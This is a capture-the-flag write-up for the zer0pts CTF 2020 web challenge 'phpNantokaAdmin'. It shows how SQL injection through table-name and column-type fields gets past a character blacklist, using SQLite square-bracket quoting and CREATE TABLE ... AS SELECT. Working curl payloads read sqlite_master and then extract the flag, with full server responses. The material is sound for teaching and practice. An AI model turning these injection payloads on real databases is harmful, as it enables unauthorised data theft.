# [zer0pts CTF 2020] phpNantokaAdmin
###### tags: `zer0pts CTF`, `zer0pts CTF 2020`, `web`

## Solution
We're given the source codes (`index.php`, `util.php`) and `Dockerfile`.

As you can see from `index.php`, the flag is stored in every created database as a table with unknown table name and unknown column name, but you can't see it.

```php=75
  $pdo->query('CREATE TABLE `' . FLAG_TABLE . '` (`' . FLAG_COLUMN . '` TEXT);');
  $pdo->query('INSERT INTO `' . FLAG_TABLE . '` VALUES ("' . FLAG . '");');
  $pdo->query($sql);
```

Obviously there are SQL injection with table name, column name, and column type when creating tables in `index.php`.

```php=32
  $stmt = $pdo->prepare("INSERT INTO `{$table_name}` VALUES (?" . str_repeat(',?', count($column_names) - 1) . ")");
  $stmt->execute($values);
```

```php=47
  if (!is_valid($table_name)) {
    flash('Table name contains dangerous characters.');
  }
  if (strlen($table_name) < 4 || 32 < strlen($table_name)) {
    flash('Table name must be 4-32 characters.');
  }
  if (count($columns) <= 0 || 10 < count($columns)) {
    flash('Number of columns is up to 10.');
  }

  $sql = "CREATE TABLE {$table_name} (";
  $sql .= "dummy1 TEXT, dummy2 TEXT";
  for ($i = 0; $i < count($columns); $i++) {
    $column = (string) ($columns[$i]['name'] ?? '');
    $type = (string) ($columns[$i]['type'] ?? '');

    if (!is_valid($column) || !is_valid($type)) {
      flash('Column name or type contains dangerous characters.');
    }
    if (strlen($column) < 1 || 32 < strlen($column) || strlen($type) < 1 || 32 < strlen($type)) {
      flash('Column name and type must be 1-32 characters.');
    }

    $sql .= ', ';
    $sql .= "`$column` $type";
  }
  $sql .= ');';
```

Unfortunately, these parameters are filtered by its length and `is_valid` function, which is defined in `util.php`.

```php=16
function is_valid($string) {
  $banword = [
    // comment out, calling function...
    "[\"#'()*,\\/\\\\`-]"
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $string)) {
    return false;
  }
  return true;
}
```

Let's check available characters.

```
$ cat test.php
<?php
function is_valid($string) {
  $banword = [
    // comment out, calling function...
    "[\"#'()*,\\/\\\\`-]"
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $string)) {
    return false;
  }
  return true;
}

$res = '';
for ($i = 0x20; $i < 0x7f; $i++) {
  $c = chr($i);
  if (is_valid($c)) {
    $res .= $c;
  }
}

echo $res . "\n";
$ php test.php
 !$%&+.0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz{|}~
```

`[` and `]` are available. In SQLite, [keywords can be enclosed in square brackets](https://www.sqlite.org/lang_keywords.html) instead of backticks, so it's worthy to use.

Also, SQLite has [`CREATE TABLE … AS` statement](https://www.sqlite.org/lang_createtable.html), which can be used to create a table from another table.

So, you can get the information about flag table by inputting `t AS SELECT sql [` to table name and `]FROM sqlite_master;` to column type when creating table.

```
$ curl 'http://3.112.201.75:8002/?page=create' -b cookie.txt -c cookie.txt -L -H 'Content-Type: application/x-www-form-urlencoded' --data 'table_name=t+AS+SELECT+sql+%5B&columns%5B0%5D%5Bname%5D=abc&columns%5B0%5D%5Btype%5D=%5DFROM+sqlite_master%3B'
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="stylesheet" href="style.css">
    <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
    <title>phpNantokaAdmin</title>
  </head>
  <body>
    <h1>phpNantokaAdmin</h1>
    <h2>t (<a href="?page=delete">Delete table</a>)</h2>
    <form action="?page=insert" method="POST">
      <table>
        <tr>
          <th> (dummy1 TEXT, dummy2 TEXT, `abc` </th>
        </tr>
        <tr>
          <td>CREATE TABLE `flag_bf1811da` (`flag_2a2d04c3` TEXT)</td>
        </tr>
        <tr>
          <td></td>
        </tr>
        <tr>
          <td><input type="text" name="values[]"></td>
        </tr>
      </table>
      <input type="submit" value="Insert values">
    </form>
  </body>
</html>
```

In the same way, you can get the flag.

```
$ curl 'http://3.112.201.75:8002/?page=create' -b cookie.txt -c cookie.txt -L -H 'Content-Type: application/x-www-form-urlencoded' --data 'table_name=t+AS+SELECT+flag_2a2d04c3+%5B&columns%5B0%5D%5Bname%5D=abc&columns%5B0%5D%5Btype%5D=%5DFROM+flag_bf1811da%3B'
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="stylesheet" href="style.css">
    <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
    <title>phpNantokaAdmin</title>
  </head>
  <body>
    <h1>phpNantokaAdmin</h1>
    <h2>t (<a href="?page=delete">Delete table</a>)</h2>
    <form action="?page=insert" method="POST">
      <table>
        <tr>
          <th> (dummy1 TEXT, dummy2 TEXT, `abc` </th>
        </tr>
        <tr>
          <td>zer0pts{Smile_Sweet_Sister_Sadistic_Surprise_Service_SQL_Injection!!}</td>
        </tr>
        <tr>
          <td><input type="text" name="values[]"></td>
        </tr>
      </table>
      <input type="submit" value="Insert values">
    </form>
  </body>
</html>
```